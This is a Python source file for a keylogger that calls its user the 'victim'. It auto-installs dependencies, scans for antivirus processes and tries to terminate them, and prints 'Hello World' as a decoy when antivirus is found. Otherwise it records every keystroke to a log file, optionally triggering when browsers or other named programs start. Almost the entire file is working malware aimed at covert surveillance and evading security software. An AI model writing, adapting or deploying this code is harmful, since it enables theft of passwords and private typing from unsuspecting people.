import sys
import time
import socket
import argparse
import logging
from threading import Thread, Event


def install_package(package):
    """runs pip install 'package'"""
    import subprocess
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])


def verify_package_installation(package):
    """tries to import the package"""
    try:
        __import__(package)
        return True
    except ImportError:
        return False


def coroutine(func):
    """Basic Coroutine Decorator"""

    def start(*args, **kwargs):
        cr = func(*args, **kwargs)
        next(cr)
        return cr

    return start


try:
    import psutil
except ImportError:
    install_package('psutil')
    if not verify_package_installation('psutil'):
        sys.exit(1)
    else:
        import psutil

# --- Setup argparse
PARSER = argparse.ArgumentParser()

PARSER.add_argument(
    '--force',
    type=int, choices=[0, 1],
    default=None,
    help='0: do not force logger if AV is on. 1: fuck it'
)

PARSER.add_argument(
    '--targets',
    type=str,
    default=[],
    help=
    'Name of target processes (ex. "chrome.exe, firefox.exe"); '
    'note: process names should be separated by ", ".'
)


def friendly_check():
    # some 'friends' that must be checked
    target_friends = ['msmpeng.exe', 'avgnt.exe', 'avp.exe',
                      'avg.exe', 'bitdefender.exe', 'comodo.exe',
                      'eset.exe', 'f-secure.exe', 'kaspersky.exe',
                      'norton.exe', 'panda.exe', 'sophos.exe',
                      'symantec.exe', 'trendmicro.exe', 'windefender.exe'
                      ]

    target_found = False
    target_killed = False
    for proc in psutil.process_iter(['name']):
        if proc.name().lower() in target_friends:
            target_found = True
            try:
                # terminate always founds a friend but is
                # never able to say goodbye to him :(
                proc.terminate()
                target_killed = True
            except psutil.AccessDenied:
                target_killed = False
    return target_killed or target_found


class ProcessListener(Thread):
    """
    Runs in background until victim executes a program in the "targets" list.
    """
    RUNNING = 1
    NOT_RUNNING = 0
    STOP = '/terminate'

    def __init__(self, targets: list, callback,
                 sleep: int = 10, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.__targets = targets
        self.__notify_callback = callback
        self.__sleep = sleep
        self.__running = {}
        self.daemon = True
        self.__stop_event = Event()

    @coroutine
    def find_process(self, targets):
        for proc in psutil.process_iter(['name']):
            if proc.name().lower() in targets:
                yield {proc.name().lower(): ProcessListener.RUNNING}

    def run(self):
        while True:
            for t in self.find_process(self.__targets):
                self.notify_logger(t)

            time.sleep(self.__sleep)

    def notify_logger(self, t):
        logging.info(f'User started {t}.')
        self.__notify_callback()

    def stop(self):
        self.__stop_event.set()


class ListenerSocket:
    """
    Used to stop ProcessListener.
    curl http://127.0.0.1:65432/terminate
    """
    HOST = '127.0.0.1'
    PORT = 65432

    def __init__(self, process_listener: ProcessListener):
        self.__process_listener = process_listener

        self.__sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.__sock.bind((ListenerSocket.HOST, ListenerSocket.PORT))
        self.__sock.listen()
        conn, addr = self.__sock.accept()
        self.handle(conn, addr)

    def handle(self, conn, addr):
        while True:
            data = conn.recv(1024)
            if not data:
                break

            request = data.decode('utf-8')
            request_line, headers = request.split('\r\n', 1)
            if ProcessListener.STOP in request_line:
                self.__process_listener.stop()
                message = 'Closed'
                response = (f"HTTP/1.1 200 OK\r\n"
                            f"Content-Type: text/plain\r\n"
                            f"Content-Length: {len(message)}\r\n\r\n{message}")
                conn.send(response.encode('utf-8'))
                conn.close()
                self.__sock.close()
                break
            else:
                conn.close()


if __name__ == "__main__":
    args = PARSER.parse_args()

    proc_targets = []
    if args.targets:
        proc_targets = args.targets.split(', ')

    # big brain time
    if (not (args.force and args.force == 1)) and friendly_check():
        print('Hello World')
    else:
        try:
            from pynput.keyboard import Listener
        except ImportError:
            install_package('pynput')
            if not verify_package_installation('pynput'):
                sys.exit(1)
            else:
                from pynput.keyboard import Listener

        logging.basicConfig(filename='../log.txt', level=logging.DEBUG)

        def on_click(key):
            logging.info(str(key))


        def start_log():
            with Listener(on_press=on_click) as keyboard_listener:
                keyboard_listener.join()

        if proc_targets:
            proc_listener = ProcessListener(proc_targets, callback=start_log)
            proc_listener.start()
            proc_handler = ListenerSocket(proc_listener)
        else:
            start_log()
